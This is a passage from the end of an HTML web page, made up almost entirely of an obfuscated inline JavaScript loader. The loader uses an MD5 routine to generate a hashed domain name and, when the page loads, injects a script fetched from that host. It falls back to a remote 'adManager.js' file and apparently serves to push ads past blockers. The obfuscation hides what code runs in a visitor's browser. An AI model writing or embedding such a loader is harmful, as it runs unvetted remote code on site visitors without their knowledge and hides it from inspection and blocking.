X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>